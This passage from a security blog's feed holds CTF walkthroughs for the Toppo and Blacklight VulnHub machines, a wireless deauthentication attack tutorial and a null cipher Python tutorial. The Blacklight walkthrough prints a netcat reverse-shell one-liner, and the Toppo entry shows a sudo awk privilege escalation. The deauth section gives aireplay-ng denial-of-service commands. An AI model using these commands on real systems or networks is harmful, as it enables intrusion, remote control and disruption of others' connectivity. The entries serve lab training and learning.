        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="toppo_walkthrough.png" alt></p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>The Machine isn’t hard to own and don’t require advanced exploitation.</p><h2 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h2><p>The Nmap scan resulted the following output:</p><pre><code>root@kali:~# nmap -A -p 1-65535 192.168.43.85Starting Nmap 7.70 ( [https://nmap.org](https://nmap.org) )Nmap scan report for Toppo (192.168.43.85)Host is up (0.00020s latency).Not shown: 65531 closed portsPORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey:|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)80/tcp    open  http    Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Clean Blog - Start Bootstrap Theme111/tcp   open  rpcbind 2-4 (RPC #100000)| rpcinfo:|   program version   port/proto  service|   100000  2,3,4        111/tcp  rpcbind|   100000  2,3,4        111/udp  rpcbind|   100024  1          41588/udp  status|_  100024  1          53515/tcp  status53515/tcp open  status  1 (RPC #100024)MAC Address: 08:00:27:B1:59:2E (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.20 ms Toppo (192.168.43.85)Nmap done: 1 IP address (1 host up) scanned in 15.09 seconds</code></pre><p>I usually start with the web server on port 80. Using nikto, I found out some interesting things.</p><pre><code>root@kali:~# nikto -h 192.168.43.85- Nikto v2.1.6--------------------------------------------------------------------+ Target IP:          192.168.43.85+ Target Hostname:    192.168.43.85+ Target Port:        80--------------------------------------------------------------------+ Server: Apache/2.4.10 (Debian)--- snip ---+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS+ OSVDB-3268: /admin/: Directory indexing found.+ OSVDB-3092: /admin/: This might be interesting...+ OSVDB-3268: /img/: Directory indexing found.+ OSVDB-3092: /img/: This might be interesting...+ OSVDB-3268: /mail/: Directory indexing found.+ OSVDB-3092: /mail/: This might be interesting...+ OSVDB-3092: /manual/: Web server manual found.+ OSVDB-3268: /manual/images/: Directory indexing found.+ OSVDB-3233: /icons/README: Apache default file found.+ 7535 requests: 0 error(s) and 15 item(s) reported on remote host--------------------------------------------------------------------+ 1 host(s) tested</code></pre><p>Alright, looks like I don’t have to run dirb. The admin directory looks pretty interesting to me. There was a notes.txt in there:</p><pre><code>Note to myself :​I need to change my password :/ 12345ted123 is too outdatedbut the technology isn&apos;t my thing i prefer go fishing or watching soccer.</code></pre><h2 id="Getting-access"><a href="#Getting-access" class="headerlink" title="Getting access"></a>Getting access</h2><p>Well, that was 2 in 1. I tried to login with with SSH and it was a success.</p><pre><code>root@kali:~# ssh ted@192.168.43.85The authenticity of host &apos;192.168.43.85 (192.168.43.85)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:+i9tqbQwK978CB+XRr02pS6QPd3evJ+lueOkK1LTtU0.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;192.168.43.85&apos; (ECDSA) to the list of known hosts.ted@192.168.43.85&apos;s password: 12345ted123The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.ted@Toppo:~$</code></pre><div class="addthis_tipjar_inline"></div><h2 id="Becoming-root"><a href="#Becoming-root" class="headerlink" title="Becoming root"></a>Becoming root</h2><p>My basic enumeration revealed that I can run the awk command as root, without the password.</p><pre><code>ted@Toppo:/$ cat /etc/sudoersted ALL=(ALL) NOPASSWD: /usr/bin/awk</code></pre><p>I’m not as familiar with awk as I wan to be, but after a little search I was able to run commands as root.</p><pre><code>ted@Toppo:/$ awk &apos;BEGIN{system(&quot;whoami&quot;)}&apos;root</code></pre><p>Now, let’s go to the root directory…</p><pre><code>ted@Toppo:/$ awk &apos;BEGIN{system(&quot;cd /root &amp;&amp; ls -la&quot;)}&apos;total 24drwx------  2 root root 4096 Apr 15 11:40 .drwxr-xr-x 21 root root 4096 Apr 15 10:02 ..-rw-------  1 root root   53 Apr 15 12:28 .bash_history-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc-rw-r--r--  1 root root  397 Apr 15 10:19 flag.txt-rw-r--r--  1 root root  140 Nov 19  2007 .profile</code></pre><p>and print out the content of the flag.txt file.</p><pre><code>ted@Toppo:/$ awk &apos;BEGIN{system(&quot;cd /root &amp;&amp; cat flag.txt&quot;)}&apos;_________                                  |  _   _  |                                 |_/ | | \_|.--.   _ .--.   _ .--.    .--.       | |  / .&apos;`\ \[ &apos;/&apos;`\ \[ &apos;/&apos;`\ \/ .&apos;`\ \   _| |_ | \__. | | \__/ | | \__/ || \__. |  |_____| &apos;.__.&apos;  | ;.__/  | ;.__/  &apos;.__.&apos;                   [__|     [__|              ​​​​Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}</code></pre><p>So, the final flag is:</p><blockquote><p><strong>0wnedlab{p4ssi0n_c0me_with_pract1ce}</strong></p></blockquote><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> CTF Walkthroughs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> ctf </tag>
            
            <tag> walkthrough </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deauthentication Attack</title>
      <link href="/2018/11/16/Deauthentication-Attack/"/>
      <url>/2018/11/16/Deauthentication-Attack/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>This Denial of Service attack is against the connected clients of a wireless network. The idea is to send deauthentication frames on behalf of the Access Point to the clients. When a connected client receives this type of wireless frame is obligated to disconnect immediately from the network.</p><h2 id="Getting-into-monitor-mode"><a href="#Getting-into-monitor-mode" class="headerlink" title="Getting into monitor mode"></a>Getting into monitor mode</h2><p>Create a monitoring interface with the following command:</p><pre><code>airmon-ng start INTERFACE</code></pre><h2 id="Network-discovery"><a href="#Network-discovery" class="headerlink" title="Network discovery"></a>Network discovery</h2><p>I’ll use Airodump-ng in order to identify the target network, but there are a number of tools out there for this job.</p><pre><code>airodump-ng MONITOR_INTERFACE</code></pre><h2 id="Filtering-out-APs"><a href="#Filtering-out-APs" class="headerlink" title="Filtering out APs"></a>Filtering out APs</h2><p>Usually, you are presented with a huge amount Access Points. You can simply narrow down the list to only show that specific AP.</p><pre><code>airodump-ng —-bssid AP_MAC_ADDRESS MONITOR_INTERFACE</code></pre><h2 id="Changing-channels"><a href="#Changing-channels" class="headerlink" title="Changing channels"></a>Changing channels</h2><p>It’s a good practice to put the WNIC (Wireless Network Interface Controller) to the same channel as with the target AP.</p><pre><code>ifconfig INTERFACE downiwconfig INTERFACE channel CHANNELifconfig INTERFACE up</code></pre><h2 id="Wireshark-filter"><a href="#Wireshark-filter" class="headerlink" title="Wireshark filter"></a>Wireshark filter</h2><p>You can capture deauthentication frames being sent in Wireshark with this filter:</p><pre><code>wlan.fc.type_subtype == 0x0c</code></pre><h2 id="Transmitting-deauth-frames"><a href="#Transmitting-deauth-frames" class="headerlink" title="Transmitting deauth frames"></a>Transmitting deauth frames</h2><p>In this step, I launch the aireplay-ng tool to transmit deauthentication frames on behalf of the AP to all the clients.</p><pre><code>aireplay-ng -0 10 -a AP_MAC_ADDRESS MONITOR_INTERFACE</code></pre><p>The “-0 10” specifies that this is a deauthentication attack and 10 is the number of frames, which you can freely change. You can also disconnect a specific client with the help of the <strong>-c CLIENT_MAC_ADDRESS</strong> switch.</p><div class="addthis_tipjar_inline"></div><h2 id="Final-words"><a href="#Final-words" class="headerlink" title="Final words"></a>Final words</h2><p>Wireless Denial of Service attacks are active attacks meaning that we are transmitting malicious frames that can be detected by an intrusion detection system or by sniffing traffic with Wireshark.</p><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> Wireless Hacking </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wireless </tag>
            
            <tag> security </tag>
            
            <tag> deauthentication </tag>
            
            <tag> dos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Null Cipher</title>
      <link href="/2018/11/16/The-Null-Cipher/"/>
      <url>/2018/11/16/The-Null-Cipher/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="the_null_cipher.png" alt></p><blockquote><p>The null cipher adds noise to the plaintext,<br>with the goal of making the plaintext hard to isolate.</p></blockquote><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In the following example, I’m going to encrypt a message with a key of 3. This means that the third letter of every word in the encrypted text will be part of the plain text. It’s important to mention that counting starts from 0, so check the fourth letter in every word. I think there is not much to explain the example is pretty straightforward.</p><p><strong>Encrypted message</strong></p><center>KUHSF URTEZ WEFCP HBVRM OJKEQ XCSTY</center><p><strong>Decrypted message</strong></p><center>SECRET</center><p>If you’re not a programmer or new to programming,<br>don’t worry I’ll try to explain how the code works.</p><h2 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    message = message.replace(<span class="string">":"</span>, <span class="string">""</span>)</span><br><span class="line">    message = message.replace(<span class="string">";"</span>, <span class="string">""</span>)</span><br><span class="line">    message = message.replace(<span class="string">","</span>, <span class="string">""</span>)</span><br><span class="line">    message = message.replace(<span class="string">"."</span>, <span class="string">""</span>)</span><br><span class="line">    message = message.replace(<span class="string">"?"</span>, <span class="string">""</span>)</span><br><span class="line">    message = message.replace(<span class="string">"!"</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">    message = message.upper()</span><br><span class="line"></span><br><span class="line">    word_substitutes = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> ALPHABET:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        index_of_plaintext = key % <span class="number">5</span></span><br><span class="line"></span><br><span class="line">        word_substitute = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">            <span class="keyword">if</span> i == index_of_plaintext:</span><br><span class="line">                word_substitute += c</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                random_letter_index = random.randint(<span class="number">0</span>, len(ALPHABET) - <span class="number">1</span>)</span><br><span class="line">                word_substitute += ALPHABET[random_letter_index]</span><br><span class="line"></span><br><span class="line">        word_substitutes.append(word_substitute)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">" "</span>.join(word_substitutes)</span><br></pre></td></tr></table></figure><p>The <em>encrypt(message, key)</em> method requires 2 parameter. One is your message, the other is key. I tried to eliminate some special characters from the supplied message, but it’s far from complete. Next, there’s a loop which goes through the message letter by letter and checks if the character is in the alphabet. If the letter is not in the alphabet, then just simply skip it. I calculated the position of the letter from the message by using the modulo operator (%) which gives the remainder of a division. In other words, the key of 3 modulo 5 gives 2. So, the index of the letter will be 2. Keep in mind, counting starts from 0!</p><p>I used another loop to add some random letters to the plain text. If the loop reaches the index of the plain text, then we append the letter otherwise just pick a random letter from the alphabet. Finally, I appended these small words and created a single space separated string.</p><h2 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    message = message.upper()</span><br><span class="line"></span><br><span class="line">    words_in_message = message.split()</span><br><span class="line"></span><br><span class="line">    decrypted_message = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words_in_message:</span><br><span class="line">        decrypted_message += word[key % <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_message</span><br></pre></td></tr></table></figure><p>The <em>decrypt(message, key)</em> method is very simple. Again, I removed some special characters and split the encrypted string. This way, I could easily loop through the words and extract the characters from the correct position. This position is the decryption key.</p><div class="addthis_tipjar_inline"></div><p><br><center>- - - - - - - - - -</center></p><h2 id="The-full-source-code"><a href="#The-full-source-code" class="headerlink" title="The full source code"></a>The full source code</h2><p>Here is the full source code, which you download and try the whole program.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ALPHABET = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    message = message.replace(<span class="string">":"</span>, <span class="string">""</span>)</span><br><span class="line">    message = message.replace(<span class="string">";"</span>, <span class="string">""</span>)</span><br><span class="line">    message = message.replace(<span class="string">","</span>, <span class="string">""</span>)</span><br><span class="line">    message = message.replace(<span class="string">"."</span>, <span class="string">""</span>)</span><br><span class="line">    message = message.replace(<span class="string">"?"</span>, <span class="string">""</span>)</span><br><span class="line">    message = message.replace(<span class="string">"!"</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">    message = message.upper()</span><br><span class="line"></span><br><span class="line">    word_substitutes = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> ALPHABET:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        index_of_plaintext = key % <span class="number">5</span></span><br><span class="line"></span><br><span class="line">        word_substitute = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">            <span class="keyword">if</span> i == index_of_plaintext:</span><br><span class="line">                word_substitute += c</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                random_letter_index = random.randint(<span class="number">0</span>, len(ALPHABET) - <span class="number">1</span>)</span><br><span class="line">                word_substitute += ALPHABET[random_letter_index]</span><br><span class="line"></span><br><span class="line">        word_substitutes.append(word_substitute)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">" "</span>.join(word_substitutes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    message = message.upper()</span><br><span class="line"></span><br><span class="line">    words_in_message = message.split()</span><br><span class="line"></span><br><span class="line">    decrypted_message = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words_in_message:</span><br><span class="line">        decrypted_message += word[key % <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    usage = <span class="string">"python null_cipher.py -e -m \"secret\"\nor\n \ "</span> \</span><br><span class="line">            <span class="string">"python null_cipher.py -d -m \"WESYL ZREFM VSCNJ HIRLG CQEKK CQTXX\""</span></span><br><span class="line">    description = <span class="string">"Command line program for demonstrating the Null cipher."</span></span><br><span class="line">    parser = argparse.ArgumentParser(usage=usage, description=description)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">'-v'</span>, <span class="string">'--version'</span>, action=<span class="string">'version'</span>, version=<span class="string">'%(prog)s 1.0'</span>)</span><br><span class="line"></span><br><span class="line">    group = parser.add_mutually_exclusive_group(required=<span class="literal">True</span>)</span><br><span class="line">    group.add_argument(<span class="string">"-e"</span>, <span class="string">"--encrypt"</span>, action=<span class="string">"store_true"</span>, dest=<span class="string">"encrypt"</span>,</span><br><span class="line">    help=<span class="string">"Encrypts the plain text message."</span>)</span><br><span class="line">    group.add_argument(<span class="string">"-d"</span>, <span class="string">"--decrypt"</span>, action=<span class="string">"store_true"</span>, dest=<span class="string">"decrypt"</span>,</span><br><span class="line">    help=<span class="string">"Decrypts the encrypted message."</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">"-m"</span>, <span class="string">"--message"</span>, action=<span class="string">"store"</span>, required=<span class="literal">True</span>, dest=<span class="string">"message"</span>,</span><br><span class="line">help=<span class="string">"You need to specify the message. Like this: -m \"secret\""</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">"-k"</span>, <span class="string">"--key"</span>, action=<span class="string">"store"</span>, required=<span class="literal">True</span>, dest=<span class="string">"key"</span>, type=int,</span><br><span class="line">                        help=<span class="string">"You need to specify the key as a positive number."</span>)</span><br><span class="line"></span><br><span class="line">    options = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.encrypt:</span><br><span class="line">        print(<span class="string">"The encrypted message is: "</span> + encrypt(options.message, options.key))</span><br><span class="line">    <span class="keyword">elif</span> options.decrypt:</span><br><span class="line">        print(<span class="string">"The decrypted message is: "</span> + decrypt(options.message, options.key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>Feel free to download and experiment with the code, it’s the best way to learn new things!<br>For example, you can create longer words to better hide the original message.</p><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cryptography </tag>
            
            <tag> cipher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blacklight Walkthrough</title>
      <link href="/2018/11/16/Blacklight-Walkthrough/"/>
      <url>/2018/11/16/Blacklight-Walkthrough/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="blacklight_walkthrough.png" alt></p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>This box can also be found on vulnhub.com. There is no proper description, but I can say that the machine is good for newbies, who want to learn.<br>Link: <a href="https://www.vulnhub.com/entry/blacklight-1,242/" target="_blank" rel="noopener">Blacklight on Vulnhub</a></p><h2 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h2><p>The usual nmap scan returned the following:</p><pre><code>root@kali:~# nmap -A -p- 192.168.43.246Nmap scan report for blacklight (192.168.43.246)Host is up (0.00020s latency).Not shown: 65533 closed portsPORT     STATE SERVICE VERSION80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: BLACKLIGHT9072/tcp open  unknown| fingerprint-strings:|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe:|_    BLACKLIGHT console mk1. Type .help for instructions1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at [https://nmap.org/cgi-bin/submit.cgi?new-service](https://nmap.org/cgi-bin/submit.cgi?new-service) :SF-Port9072-TCP:V=7.70%I=7%D=8/15%Time=5B7442E6%P=x86_64-pc-linux-gnu%r(NUSF:LL,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instrSF:uctions\n&quot;)%r(GenericLines,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\xSF:20\.help\x20for\x20instructions\n&quot;)%r(GetRequest,34,&quot;BLACKLIGHT\x20consSF:ole\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(HTTPOptionsSF:,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instrucSF:tions\n&quot;)%r(RTSPRequest,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\SF:.help\x20for\x20instructions\n&quot;)%r(RPCCheck,34,&quot;BLACKLIGHT\x20console\xSF:20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(DNSVersionBindReSF:qTCP,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20insSF:tructions\n&quot;)%r(DNSStatusRequestTCP,34,&quot;BLACKLIGHT\x20console\x20mk1\.\SF:x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(Help,34,&quot;BLACKLIGHT\x20cSF:onsole\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(SSLSessiSF:onReq,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20inSF:structions\n&quot;)%r(TLSSessionReq,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20TySF:pe\x20\.help\x20for\x20instructions\n&quot;)%r(Kerberos,34,&quot;BLACKLIGHT\x20coSF:nsole\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(SMBProgNeSF:g,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instruSF:ctions\n&quot;)%r(X11Probe,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.hSF:elp\x20for\x20instructions\n&quot;)%r(FourOhFourRequest,34,&quot;BLACKLIGHT\x20coSF:nsole\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(LPDStringSF:,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instrucSF:tions\n&quot;)%r(LDAPSearchReq,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x2SF:0\.help\x20for\x20instructions\n&quot;)%r(LDAPBindReq,34,&quot;BLACKLIGHT\x20consSF:ole\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(SIPOptions,SF:34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instructSF:ions\n&quot;)%r(LANDesk-RC,34,&quot;BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.hSF:elp\x20for\x20instructions\n&quot;)%r(TerminalServer,34,&quot;BLACKLIGHT\x20consoSF:le\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;)%r(NCP,34,&quot;BLACSF:KLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n&quot;);MAC Address: 08:00:27:44:1E:0A (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.20 ms blacklight (192.168.43.246)</code></pre><h2 id="The-first-flag"><a href="#The-first-flag" class="headerlink" title="The first flag"></a>The first flag</h2><p>I started with the web server on port 80. There was nothing particularly interesting on the server except the robots.txt file, which revealed the first flag.</p><blockquote><p>{flag1:fc4c7223964a26b152823d14f129687207e7fe15}</p></blockquote><p>There was also a blacklight.dict file, but at this point, it was not useful. I went back to check out port 9072 with netcat:</p><pre><code>root@kali:~# nc 192.168.43.246 9072BLACKLIGHT console mk1. Type .help for instructions.help.readhash - Get one step closer.exec &lt;cmd&gt; - Execute commands.quit - Exit the server.readhashb5f4723bd6df85b54b0905bd6d734be9ef1cc1eb977413a932a828b5c52ef5a6You have one more command until the server shuts down. Choose wisely!</code></pre><div class="addthis_tipjar_inline"></div><h2 id="Getting-root-access"><a href="#Getting-root-access" class="headerlink" title="Getting root access"></a>Getting root access</h2><p>I chose the easy way, but it got me nowhere. I tried to execute a command, but since the output was not displayed, I couldn’t make use of it. Then, I tried executing different reverse shells from pentestmonkey’s website.<br>The second netcat command was the winner:</p><pre><code>.exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.43.5 443 &gt;/tmp/f</code></pre><p>Before executing the above command, I obviously set up a listener:</p><pre><code>root@kali:~# nc -lp 443/bin/sh: 0: can&apos;t access tty; job control turned off# python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;root@blacklight:~#</code></pre><p>As you can see, I used python to upgrade to a pseudo-terminal and the shell had root privileges, which was awesome. I took the hint from the first flag and started searching in the home folder of the user blacklight.</p><pre><code>root@blacklight:/home/blacklight# ls -latotal 48drwxr-xr-x 6 blacklight blacklight 4096 Jun  7 23:49 .drwxr-xr-x 3 root       root       4096 Jun  7 21:01 ..-rw------- 1 blacklight blacklight 1019 Jun  8 00:24 .bash_history-rw-r--r-- 1 blacklight blacklight  220 Apr  4 18:30 .bash_logout-rw-r--r-- 1 blacklight blacklight 3771 Apr  4 18:30 .bashrcdrwx------ 2 blacklight blacklight 4096 Jun  7 21:01 .cache-rwxrwxr-x 1 blacklight blacklight 1019 Jun  7 23:49 console.rbdrwx------ 3 blacklight blacklight 4096 Jun  7 21:01 .gnupg-rw-r--r-- 1 root       